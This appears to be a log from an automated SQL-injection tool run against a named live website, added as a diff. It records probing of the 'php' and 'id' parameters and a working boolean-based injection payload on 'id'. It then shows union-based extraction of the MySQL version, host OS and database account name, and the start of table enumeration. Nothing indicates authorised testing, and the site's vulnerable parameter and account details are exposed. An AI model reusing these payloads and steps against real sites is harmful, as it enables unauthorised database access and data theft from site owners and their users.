@@ -1,0 +1,183 @@
+2019-04-24 14:15:12  Scan Page, crawl links and scan ...
+2019-04-24 14:15:12  14:15:12 Checking SQL Injection: http://vnbarcode.com/?php=product_detail&id=316
+2019-04-24 14:15:14  14:15:14 Checking SQL Injection, ErrorBased, Parameter: php
+2019-04-24 14:15:16  14:15:15 Checking SQL Injection, BooleanBased, Parameter: php
+2019-04-24 14:15:16  GET  http://vnbarcode.com/?id=316&php=product_detail  String URL1 StatusCode!=OK
+2019-04-24 14:15:16  GET  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:17  GET  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:18  COOKIE  http://vnbarcode.com/?id=316&php=product_detail  String URL1 StatusCode!=OK
+2019-04-24 14:15:19  GET  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:19  COOKIE  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:20  COOKIE  http://vnbarcode.com/?id=316&php=product_detail  String URL1 StatusCode!=OK
+2019-04-24 14:15:21  GET  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:22  COOKIE  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:23  COOKIE  http://vnbarcode.com/?id=316&php=product_detail  String URL1 StatusCode!=OK
+2019-04-24 14:15:24  GET  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:24  COOKIE  http://vnbarcode.com/?id=316&php=99999999  String URL1 StatusCode!=OK
+2019-04-24 14:15:26  GET  http://vnbarcode.com/?id=316&php=  Search URL1 StatusCode!=OK
+2019-04-24 14:15:26  GET  http://vnbarcode.com/?id=316&php=  Search URL1 StatusCode!=OK
+2019-04-24 14:15:27  14:15:27 Checking SQL Injection, BooleanBased Rlike Blind, Parameter: php
+2019-04-24 14:15:28  GET  http://vnbarcode.com/?id=316&php=product_detail  Integer KeyWord=
+2019-04-24 14:15:29  GET  http://vnbarcode.com/?id=316&php=product_detail  String KeyWord=
+2019-04-24 14:15:31  GET  http://vnbarcode.com/?id=316&php=product_detail  Search KeyWord=
+2019-04-24 14:15:31  14:15:31 Checking SQL Injection, TimeBased, Parameter: php
+2019-04-24 14:15:40  14:15:40 Checking SQL Injection, ErrorBased, Parameter: id
+2019-04-24 14:15:43  14:15:43 Checking SQL Injection, BooleanBased, Parameter: id
+2019-04-24 14:15:43  GET  http://vnbarcode.com/?php=product_detail&id=316  Integer URL1 StatusCode!=OK
+2019-04-24 14:15:44  GET  http://vnbarcode.com/?php=product_detail&id=99999999  Integer URL1 StatusCode!=OK
+2019-04-24 14:15:44  GET  http://vnbarcode.com/?php=product_detail&id=99999999  Integer URL1 StatusCode!=OK
+2019-04-24 14:15:47  COOKIE  http://vnbarcode.com/?php=product_detail&^id=316  Integer KeyWord= TTR
+2019-04-24 14:15:47  14:15:47 Found BooleanBased SQL Injection Vuln: http://vnbarcode.com/?php=product_detail&^id=316 aNd 2194803=2194803-- 
+2019-04-24 14:15:47  14:15:47 Checking SQL Injection, BooleanBased Rlike Blind, Parameter: id
+2019-04-24 14:15:48  GET  http://vnbarcode.com/?php=product_detail&id=316  Integer KeyWord=
+2019-04-24 14:15:49  GET  http://vnbarcode.com/?php=product_detail&id=316  String KeyWord=
+2019-04-24 14:15:51  GET  http://vnbarcode.com/?php=product_detail&id=316  Search KeyWord=
+2019-04-24 14:15:51  14:15:51 Checking SQL Injection, TimeBased, Parameter: id
+2019-04-24 14:16:05  14:16:05 Checking URL XSS: http://vnbarcode.com/?php=product_detail&id=316
+2019-04-24 14:16:06  End Check XSS Vuln: http://vnbarcode.com/?php=product_detail&id=316
+2019-04-24 14:16:06  14:16:06 Checking LFI: http://vnbarcode.com/?php=product_detail&id=316
+2019-04-24 14:16:07  14:16:07 Checking RFI: http://vnbarcode.com/?php=product_detail&id=316
+2019-04-24 14:16:07  14:16:07 Checking Form Vuln with Referer: http://vnbarcode.com/?php=product_detail&id=316
+2019-04-24 14:23:02  14:23:02 Getting DataBase Type...
+2019-04-24 14:23:07  14:23:07 Got Database Type: MySQL
+2019-04-24 14:23:07  14:23:07 Trying Injection Method ...
+2019-04-24 14:23:07  14:23:07 Getting the number of fields in SQL ...
+2019-04-24 14:23:12  14:23:12 Got field number: 20
+2019-04-24 14:23:12  14:23:12 Checking if there is an injectale field in SQL ...
+2019-04-24 14:23:12  14:23:12 Got Union index: 5
+2019-04-24 14:23:12  14:23:12 Got: UnionBased
+2019-04-24 14:23:13  14:23:13 Got Item: 5.0.51a-community
+2019-04-24 14:23:13  14:23:13 Got Item: redhat-linux-gnu
+2019-04-24 14:23:13  14:23:13 Got Item: vnbarcodec_ha@localhost
+2019-04-24 14:23:13  14:23:13 Got Item: vnbarcodec_ha
+2019-04-24 14:23:13  14:23:13 Got Item: 
+2019-04-24 14:23:13  14:23:13 Got Item: 
+2019-04-24 14:23:13  14:23:13 Got Item: 
+2019-04-24 14:23:14  14:23:14 Got Item: 
+2019-04-24 14:23:16  14:23:16 Got Int: -1
+2019-04-24 14:23:16  14:23:16 Got Length: -1
+2019-04-24 14:23:34  14:23:34 Getting Tables ...
+2019-04-24 14:23:36  14:23:36 Got Item: 
+2019-04-24 14:23:37  14:23:37 Got Item: 
+2019-04-24 14:23:49  14:23:49 Got Table Num: 14
+2019-04-24 14:23:50  14:23:50 Got Item: 
+2019-04-24 14:23:51  14:23:51 Got Item: 
+2019-04-24 14:23:51  14:23:51 Got Item: 
+2019-04-24 14:23:52  14:23:52 Got Item: 
+2019-04-24 14:23:52  14:23:52 Got Item: 
+2019-04-24 14:23:52  14:23:52 Got Item: 
+2019-04-24 14:23:53  14:23:53 Got Item: 
+2019-04-24 14:23:53  14:23:53 Got Item: 
+2019-04-24 14:23:53  14:23:53 Got Item: 
+2019-04-24 14:23:53  14:23:53 Got Item: 
+2019-04-24 14:23:54  14:23:54 Got Item: 
+2019-04-24 14:23:54  14:23:54 Got Item: 
+2019-04-24 14:23:54  14:23:54 Got Item: 
+2019-04-24 14:23:54  14:23:54 Got Item: 
+2019-04-24 14:23:55  14:23:55 Got Item: 
+2019-04-24 14:23:55  14:23:55 Got Item: 
+2019-04-24 14:23:55  14:23:55 Got Item: 
+2019-04-24 14:23:55  14:23:55 Got Item: 
+2019-04-24 14:23:56  14:23:56 Got Item: 
+2019-04-24 14:23:56  14:23:56 Got Item: 
+2019-04-24 14:23:56  14:23:56 Got Item: 
+2019-04-24 14:23:56  14:23:56 Got Item: 
+2019-04-24 14:23:57  14:23:57 Got Item: 
+2019-04-24 14:23:58  14:23:58 Got Item: 
+2019-04-24 14:23:58  14:23:58 Got Item: 
+2019-04-24 14:23:58  14:23:58 Got Item: 
+2019-04-24 14:23:59  14:23:59 Got Item: 
+2019-04-24 14:23:59  14:23:59 Got Item: 
+2019-04-24 14:24:03  14:24:03 Got Item: 
+2019-04-24 14:24:05  14:24:05 Got Item: 
+2019-04-24 14:24:07  14:24:07 Got Item: 
+2019-04-24 14:24:08  14:24:08 Got Item: 
+2019-04-24 14:24:08  14:24:08 Got Item: 
+2019-04-24 14:24:08  14:24:08 Got Item: 
+2019-04-24 14:24:09  14:24:09 Got Item: 
+2019-04-24 14:24:09  14:24:09 Got Item: 
+2019-04-24 14:24:09  14:24:09 Got Length: 11
+2019-04-24 14:24:09  14:24:09 Got Item: 
+2019-04-24 14:24:09  14:24:09 Got Item: 
+2019-04-24 14:24:09  14:24:09 Got Item: 
+2019-04-24 14:24:10  14:24:10 Got Item: 
+2019-04-24 14:24:10  14:24:10 Got Item: 
+2019-04-24 14:24:10  14:24:10 Got Item: 
+2019-04-24 14:24:10  14:24:10 Got Length: 10
+2019-04-24 14:24:10  14:24:10 Got Item: 
+2019-04-24 14:24:11  14:24:11 Got Item: 
+2019-04-24 14:24:11  14:24:11 Got Item: 
+2019-04-24 14:24:11  14:24:11 Got Item: 
+2019-04-24 14:24:12  14:24:12 Got Item: 
+2019-04-24 14:24:12  14:24:12 Got Item: 
+2019-04-24 14:24:12  14:24:12 Got Item: 
+2019-04-24 14:24:12  14:24:12 Got Length: 20
+2019-04-24 14:24:13  14:24:13 Got Item: 
+2019-04-24 14:24:13  14:24:13 Got Item: 
+2019-04-24 14:24:13  14:24:13 Got Length: 20
+2019-04-24 14:24:14  14:24:14 Got Item: 
+2019-04-24 14:24:14  14:24:14 Got Length: 11
+2019-04-24 14:24:14  14:24:14 Got Length: 19
+2019-04-24 14:24:14  14:24:14 Got Item: 
+2019-04-24 14:24:15  14:24:15 Got Item: 
+2019-04-24 14:24:15  14:24:15 Got Length: 10
+2019-04-24 14:24:16  14:24:16 Got Item: 
+2019-04-24 14:24:16  14:24:16 Got Length: 11
+2019-04-24 14:24:16  14:24:16 Got Item: 
+2019-04-24 14:24:16  14:24:16 Got Length: 20
+2019-04-24 14:24:17  14:24:17 Got Length: 11
+2019-04-24 14:24:17  14:24:17 Got Item: 
+2019-04-24 14:24:18  14:24:18 Got Item: 
+2019-04-24 14:24:18  14:24:18 Got Item: 
+2019-04-24 14:24:19  14:24:19 Got Item: 
+2019-04-24 14:24:21  14:24:21 Got 1/11 :  t
+2019-04-24 14:24:22  14:24:22 Got Length: 15
+2019-04-24 14:24:22  14:24:22 Got Length: 15
+2019-04-24 14:24:23  14:24:23 Got 1/10 :  t
+2019-04-24 14:24:23  14:24:23 Got Item: 
+2019-04-24 14:24:23  14:24:23 Got Item: 
+2019-04-24 14:24:23  14:24:23 Got Item: 
+2019-04-24 14:24:23  14:24:23 Got Item: 
+2019-04-24 14:24:23  14:24:23 Got Item: 
+2019-04-24 14:24:23  14:24:23 Got Item: 
+2019-04-24 14:24:26  14:24:26 Got 1/11 :  t
+2019-04-24 14:24:28  14:24:28 Got 1/20 :  t
+2019-04-24 14:24:30  14:24:30 Got Item: 
+2019-04-24 14:24:30  14:24:30 Got 1/15 :  t
+2019-04-24 14:24:30  14:24:30 Got 1/10 :  t
+2019-04-24 14:24:30  14:24:30 Got 1/11 :  t
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:31  14:24:31 Got Item: 
+2019-04-24 14:24:37  14:24:37 Got Item: 
+2019-04-24 14:24:38  14:24:38 Got Item: 
+2019-04-24 14:24:38  14:24:38 Got Item: 
+2019-04-24 14:24:39  14:24:39 Got Item: 
+2019-04-24 14:24:39  14:24:39 Got Item: 
+2019-04-24 14:24:42  14:24:42 Got Item: 
+2019-04-24 14:24:49  14:24:49 Got 2/11 :  tb
+2019-04-24 14:24:49  14:24:49 Got 1/20 :  t
+2019-04-24 14:24:50  14:24:50 Got 2/10 :  tb
+2019-04-24 14:24:50  14:24:50 Got 1/19 :  t
+2019-04-24 14:24:51  14:24:51 Got 2/11 :  tb
+2019-04-24 14:24:52  14:24:52 Got 2/11 :  tb
+2019-04-24 14:24:52  14:24:52 Got 2/10 :  tb
+2019-04-24 14:24:53  14:24:53 Got 1/15 :  t
+2019-04-24 14:24:53  14:24:53 Got Item: 
+2019-04-24 14:24:53  14:24:53 Got Int: -1
+2019-04-24 14:24:54  14:24:54 Got Item: 
+2019-04-24 14:24:54  14:24:54 Got Item: 
+2019-04-24 14:24:54  14:24:54 Got Item: 
+2019-04-24 14:24:54  14:24:54 Got Item: 
